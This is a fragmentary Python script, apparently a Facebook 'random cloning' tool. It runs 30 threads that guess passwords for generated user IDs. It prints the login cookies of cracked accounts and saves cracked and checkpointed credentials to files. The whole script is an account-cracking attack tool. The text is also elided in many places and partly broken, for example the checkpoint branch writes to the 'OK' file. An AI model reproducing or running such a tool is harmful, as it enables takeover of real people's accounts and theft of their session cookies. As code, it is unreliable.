...
;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : Bishal DAS             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Bishal DAS            
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO Bishal RANDOM TOOLS"')
        print(logo)
        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
        print(" \x1b[1;94m[0] Exit")
        Bishalsexy =input("\n \x1b[1;96m[?] Choose : ")
        if Bishalsexy in ["1","01"]:
            fuck()
        if Bishalsexy in [" 0", "00"]:
            exit()
        else:
            exit()
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for love in user:
            ...
            yaari.submit(Bishalsexy2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in Bishal/OK.txt')
    print(' [+] CP Ids saved in Bishal/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def Bishalsexy2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Bishal]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[Bishal-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[Bishal-CP☠️] {uid}|{ps}")
                open('/sdcard/Bishal-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
